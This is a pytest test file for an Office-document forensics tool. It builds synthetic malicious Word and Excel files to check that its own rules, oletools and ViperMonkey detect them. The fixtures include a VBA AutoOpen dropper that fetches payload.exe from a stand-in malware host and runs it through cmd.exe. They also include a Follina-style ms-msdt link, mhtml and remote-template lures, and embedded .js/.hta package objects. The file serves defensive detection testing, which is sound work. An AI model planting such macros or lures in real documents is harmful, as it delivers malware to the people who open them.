"""Office block: VBA project builder, own Office rules, VBA/OLE tools, .xlsb, ViperMonkey."""

from __future__ import annotations

import random
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import officekit as ok  # noqa: E402
import ovba  # noqa: E402
from ovba import Module  # noqa: E402

from docutracex.config import settings  # noqa: E402
from docutracex.parsers import office_rules, vba_tools, vipermonkey, xlsb  # noqa: E402

DATA = Path(__file__).resolve().parent / "data"

DROPPER = '''Sub AutoOpen()
    Dim u As String
    u = StrReverse("exe.daolyap/moc.elpmaxe.erawlam//:ptth")
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    Shell "cmd.exe /c %TEMP%\\invoice.exe", vbHide
End Sub'''


def _rules(findings):
    return {f["rule"] for f in findings}


# --- MS-OVBA builder ------------------------------------------------------------------

def test_ovba_compression_round_trips_with_olevba() -> None:
    from oletools.olevba import decompress_stream

    rnd = random.Random(1)
    for data in (b"Sub X()\r\nEnd Sub\r\n" * 500, b"A" * 9000, bytes(rnd.randrange(256) for _ in range(4096))):
        assert decompress_stream(bytearray(ovba.compress(data))) == data


def test_generated_vba_project_is_read_by_olevba(tmp_path: Path) -> None:
    from oletools.olevba import VBA_Parser

    p = tmp_path / "a.docm"
    p.write_bytes(ok.docm(["Hello"], [Module("Module1", DROPPER)]))
    vp = VBA_Parser(str(p))
    assert vp.detect_vba_macros()
    codes = [c for (_f, _s, _n, c) in vp.extract_macros()]
    assert any("StrReverse" in c for c in codes)
    kinds = {k for (k, _kw, _d) in vp.analyze_macros()}
    assert {"AutoExec", "Suspicious", "IOC"} <= kinds


# --- own Office rules -------------------------------------------------------------------

def test_ooxml_rules_detect_each_technique(tmp_path: Path) -> None:
    p = tmp_path / "factura.docm"
    p.write_bytes(ok.docm(
        ["Factura"], [Module("Module1", DROPPER)],
        fields=['INCLUDEPICTURE "http://track.example.net/p.png" \\d',
                'INCLUDETEXT "\\\\\\\\203.0.113.7\\\\s\\\\t.docx"'],
        remote_template="http://templates.example.org/t.dotm",
        doc_vars={"payload": "TVqQAAMA" * 40},
        custom={"Note": "aHR0cDovL21hbHdhcmUuZXhhbXBsZS5jb20v" * 4},
        activex_clsid="04A1E553-FE36-4FDE-865E-344194E69424",
        embeddings={"oleObject1.bin": ok.package_object("factura.js", b"WScript.Echo(1)"),
                    "oleObject2.bin": ok.equation_object()},
        ole_links=["mhtml:http://cdn.example.org/a.html!x-usc:http://cdn.example.org/a.html",
                   "ms-msdt:/id PCWDiagnostic /skip force"],
        addin_store="https://addins.example.com/store",
        app=ok.app_xml("Microsoft Office Word", "Contoso",
                       template="C:\\Users\\jmartin\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm"),
        rsids=["00A1B2C3", "00D4E5F6"]))
    res = office_rules.analyze_ooxml(p)
    rules = _rules(res["findings"])
    assert {"remote_template", "follina_msdt", "mshtml_mhtml", "external_ole_object",
            "remote_field_resource", "unc_file_target", "document_variables", "activex_control",
            "package_object", "equation_editor", "office_addin", "custom_property_payload",
            "author_local_path"} <= rules
    pkg = next(f for f in res["findings"] if f["rule"] == "package_object")
    assert pkg["severity"] == "high" and "factura.js" in pkg["detail"]
    assert res["attribution"]["company"] == "Contoso" and res["attribution"]["rsid_count"] == 2


def test_ole_rules_detect_objects_and_remote_template(tmp_path: Path) -> None:
    p = tmp_path / "pedido.doc"
    p.write_bytes(ok.doc_legacy(
        "Pedido", None,
        objects={"_1": ok.equation_object(), "_2": ok.package_object("albaran.hta", b"<script/>"),
                 "_3": ok.ole2link_object("http://203.0.113.50/t.hta")},
        summary=ok.summary_information("Maria", "jmartin", template="\\\\203.0.113.50\\s\\N.dotm")))
    res = office_rules.analyze_ole(p)
    rules = _rules(res["findings"])
    assert {"equation_editor", "package_object", "ole2link", "remote_template_name"} <= rules
    link = next(f for f in res["findings"] if f["rule"] == "ole2link")
    assert link["evidence"] == "http://203.0.113.50/t.hta"
    assert res["attribution"]["author"] == "Maria"


def test_clean_document_has_no_rule_findings(tmp_path: Path) -> None:
    p = tmp_path / "clean.docx"
    p.write_bytes(ok.docm(["Minutes of the meeting"], macro=False))
    assert office_rules.analyze_ooxml(p)["findings"] == []


def test_excel_xlm_rules() -> None:
    res = xlsb.analyze(DATA / "excel4_sample_macro.xlsb")
    assert res["module"] == "excel" and res["variant"] == "xlsb"
    assert {"xlm_macrosheet", "xlm_auto_open"} <= _rules(res["findings"])
    assert any("ALERT" in f for f in res["macro_formulas"])


# --- VBA / OLE tools ------------------------------------------------------------------

def test_vba_tools_hidden_module_and_lock(tmp_path: Path) -> None:
    p = tmp_path / "a.docm"
    from oletools.olevba import VBA_Parser  # noqa: F401
    import zipfile, io  # noqa: E401

    bin_ = ovba.vba_project_bin([Module("Module1", DROPPER), Module("NewMacros", "Sub H()\nEnd Sub", hidden=True)],
                                locked=True)
    raw = ok.docm(["x"], [Module("Module1", DROPPER)])
    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(raw)) as zin, zipfile.ZipFile(buf, "w") as zout:
        for it in zin.infolist():
            zout.writestr(it, bin_ if it.filename == "word/vbaProject.bin" else zin.read(it.filename))
    p.write_bytes(buf.getvalue())
    res = vba_tools.analyze(p, "ooxml", True, [])
    rules = _rules(res["findings"])
    assert {"vba_hidden_module", "vba_project_locked"} <= rules
    assert res["project"]["hidden_modules"] == ["NewMacros"]
    assert res["tools"]["pcodedmp"]["command"].startswith("pcodedmp")
    assert "pywin32" not in (res["tools"]["pcodedmp"].get("output") or "")


def test_ole_trailing_data(tmp_path: Path) -> None:
    p = tmp_path / "t.doc"
    p.write_bytes(ok.doc_legacy("x") + b"HIDDEN" * 400)
    res = vba_tools.analyze(p, "ole", False)
    assert "ole_trailing_data" in _rules(res["findings"])


# --- ViperMonkey (needs the PyPy 2.7 portable) ------------------------------------------

@pytest.mark.skipif(settings.pypy_python() is None, reason="PyPy/ViperMonkey not provisioned")
def test_vipermonkey_resolves_obfuscated_url_and_command(tmp_path: Path) -> None:
    p = tmp_path / "f.docm"
    p.write_bytes(ok.docm(["Factura"], [Module("Module1", DROPPER)]))
    res = vipermonkey.analyze(p, tmp_path / "extracted")
    params = " ".join(a["parameters"] for a in res["actions"])
    assert "http://malware.example.com/payload.exe" in params
    assert {"vm_network", "vm_execute"} <= _rules(res["findings"])
